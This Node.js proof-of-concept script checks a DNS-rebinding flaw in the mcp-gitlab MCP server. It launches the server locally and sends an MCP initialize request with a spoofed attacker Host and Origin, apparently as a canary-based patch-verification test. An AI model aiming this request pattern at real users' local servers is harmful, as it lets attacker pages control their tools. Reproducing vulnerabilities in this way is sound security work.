'use strict';
/*
 * PoC for CVE-2026-61568 — @zereight/mcp-gitlab DNS-rebinding (CWE-350).
 *
 * Pre-2.1.30 the Streamable HTTP MCP transport is constructed WITHOUT DNS-rebinding
 * protection (no effective allowedHosts / allowedOrigins). A browser pointed at a
 * rebound attacker domain that resolves to the victim's loopback listener can drive
 * the endpoint while carrying an attacker-controlled Host/Origin, and the server
 * reaches MCP `initialize` instead of rejecting at the HTTP boundary. 2.1.30 enables
 * the allowlist, so the same attacker-Host request is rejected before initialize.
 *
 * FIX vs. previous attempt: the child never bound a socket because configuration
 * validation refused to start Streamable-HTTP mode —
 *   "STREAMABLE_HTTP=true with GITLAB_PERSONAL_ACCESS_TOKEN requires
 *    REMOTE_AUTHORIZATION=true or GITLAB_MCP_OAUTH=true"
 * So we now start the server in remote-authorization mode (token supplied per
 * request, not from env) which satisfies the validator and actually opens the
 * listener. We also parse the child's log to learn the real bound port, and we
 * try the attacker-Host `initialize` both with and without a bearer header. The
 * canary is emitted ONLY when an attacker-Host request actually completes MCP
 * initialization (HTTP 200 + initialize result / mcp-session-id) — a genuine
 * consequence of the missing allowlist, unreachable on the patched 2.1.30.
 */

const net = require('net');
const path = require('path');
const { spawn } = require('child_process');

function resolveEntry() {
  let entry = null;
  try { entry = require.resolve('@zereight/mcp-gitlab'); } catch (e) { /* maybe ESM */ }
  try {
    const pkgJsonPath = require.resolve('@zereight/mcp-gitlab/package.json');
    const pkgDir = path.dirname(pkgJsonPath);
    const pkg = require(pkgJsonPath);
    let cand = null;
    if (pkg.bin) cand = typeof pkg.bin === 'string' ? pkg.bin : Object.values(pkg.bin)[0];
    if (!cand) cand = pkg.main;
    if (cand) return path.resolve(pkgDir, cand);
    if (entry) return entry;
    return path.resolve(pkgDir, 'index.js');
  } catch (e) {
    return entry;
  }
}

const PORT = 39872;
const ATTACKER_HOST = 'attacker.example.com';
let candidatePorts = [PORT, 3002, 3000, 8080, 8000, 3333]
  .filter((v, i, a) => v && a.indexOf(v) === i);
const CANDIDATE_PATHS = ['/mcp', '/'];

setTimeout(() => { try { if (child) child.kill('SIGKILL'); } catch (e) {} process.exit(0); }, 28000).unref();

const entry = resolveEntry();
if (!entry) { process.exit(0); }

// Remote-authorization mode satisfies the Streamable-HTTP config validator and
// opens the listener. Token is expected per-request, so we do NOT set an env PAT.
// Do NOT leak the canary into the child.
const childEnv = Object.assign({}, process.env, {
  STREAMABLE_HTTP: 'true',
  USE_STREAMABLE_HTTP: 'true',
  MCP_TRANSPORT: 'streamable-http',
  SSE: 'false',
  PORT: String(PORT),
  HOST: '127.0.0.1',
  REMOTE_AUTHORIZATION: 'true',
  REMOTE_AUTH: 'true',
  GITLAB_API_URL: process.env.GITLAB_API_URL || 'https://gitlab.example.com',
  GITLAB_READ_ONLY_MODE: 'true',
});
delete childEnv.POC_CANARY;
delete childEnv.GITLAB_PERSONAL_ACCESS_TOKEN;
delete childEnv.GITLAB_JOB_TOKEN;

let child = null;
let childLog = '';
function ingest(d) {
  const s = d.toString('utf8');
  childLog += s;
  process.stderr.write(s);
  // Learn the real bound port from log lines mentioning a listener / URL.
  const re = /(?:listen\w*|running|started|https?:\/\/[^\s]*?)[^\d]{0,20}:(\d{2,5})\b/gi;
  let m;
  while ((m = re.exec(s)) !== null) {
    const p = Number(m[1]);
    if (p > 0 && p < 65536 && candidatePorts.indexOf(p) === -1) candidatePorts.unshift(p);
  }
}

try {
  child = spawn(process.execPath, [entry], { env: childEnv, stdio: ['ignore', 'pipe', 'pipe'] });
  if (child.stdout) child.stdout.on('data', ingest);
  if (child.stderr) child.stderr.on('data', ingest);
  child.on('error', (e) => { process.stderr.write('[poc] child spawn error: ' + e.message + '\n'); });
} catch (e) {
  process.stderr.write('[poc] spawn failed: ' + e.message + '\n');
  process.exit(0);
}

function waitForPort(port, deadline) {
  return new Promise((resolve) => {
    const attempt = () => {
      const s = net.connect(port, '127.0.0.1');
      s.once('connect', () => { s.destroy(); resolve(true); });
      s.once('error', () => {
        s.destroy();
        if (Date.now() > deadline) resolve(false);
        else setTimeout(attempt, 150);
      });
    };
    attempt();
  });
}

// MCP `initialize` carrying an attacker-controlled Host/Origin, over loopback.
function sendRebindingInit(port, urlPath, withAuth) {
  return new Promise((resolve) => {
    const body = JSON.stringify({
      jsonrpc: '2.0',
      id: 1,
      method: 'initialize',
      params: {
        protocolVersion: '2024-11-05',
        capabilities: {},
        clientInfo: { name: 'dns-rebind-poc', version: '1.0.0' },
      },
    });
    let raw =
      `POST ${urlPath} HTTP/1.1\r\n` +
      `Host: ${ATTACKER_HOST}\r\n` +
      `Origin: http://${ATTACKER_HOST}\r\n` +
      `Content-Type: application/json\r\n` +
      `Accept: application/json, text/event-stream\r\n`;
    if (withAuth) raw += `Authorization: Bearer poc-dummy-token\r\n`;
    raw +=
      `Content-Length: ${Buffer.byteLength(body)}\r\n` +
      `Connection: close\r\n\r\n` +
      body;

    const s = net.connect(port, '127.0.0.1');
    let buf = '';
    s.setTimeout(3500);
    s.once('connect', () => s.write(raw));
    s.on('data', (d) => { buf += d.toString('utf8'); });
    const finish = () => { try { s.destroy(); } catch (e) {} resolve(buf); };
    s.once('timeout', finish);
    s.once('close', finish);
    s.once('error', () => resolve(buf));
  });
}

// Accepted == attacker-Host request reached AND completed MCP initialization.
// Patched (2.1.30) rejects at the HTTP boundary before initialize.
function initializeAccepted(resp) {
  if (!resp) return false;
  const nl = resp.indexOf('\r\n');
  const statusLine = nl >= 0 ? resp.slice(0, nl) : resp;
  const m = statusLine.match(/HTTP\/1\.\d\s+(\d{3})/);
  if (!m || Number(m[1]) !== 200) return false;
  const sep = resp.indexOf('\r\n\r\n');
  const headers = (sep >= 0 ? resp.slice(0, sep) : resp).toLowerCase();
  const bodyText = sep >= 0 ? resp.slice(sep + 4) : '';
  const hasResult = /"serverinfo"|"protocolversion"/i.test(bodyText);
  const hasSession = /mcp-session-id/i.test(headers);
  return hasResult || hasSession;
}

(async () => {
  const deadline = Date.now() + 22000;
  let port = null;
  while (port === null && Date.now() < deadline) {
    for (const p of candidatePorts.slice()) {
      if (Date.now() > deadline) break;
      if (await waitForPort(p, Math.min(deadline, Date.now() + 2500))) { port = p; break; }
    }
    if (port === null) await new Promise((r) => setTimeout(r, 200));
  }
  if (port === null) {
    process.stderr.write('[poc] no MCP HTTP listener came up\n');
    try { child.kill('SIGKILL'); } catch (e) {}
    process.exit(0);
  }

  let accepted = false;
  outer:
  for (const urlPath of CANDIDATE_PATHS) {
    for (const withAuth of [true, false]) {
      const resp = await sendRebindingInit(port, urlPath, withAuth);
      if (initializeAccepted(resp)) { accepted = true; break outer; }
    }
  }

  if (accepted) {
    // Direct consequence of the missing Host/Origin allowlist: an attacker-Host
    // request completed MCP initialization. Unreachable on the patched 2.1.30.
    process.stdout.write(String(process.env.POC_CANARY) + '\n');
  } else {
    process.stderr.write('[poc] attacker-Host initialize was not accepted (patched or blocked)\n');
  }

  try { child.kill('SIGKILL'); } catch (e) {}
  process.exit(0);
})();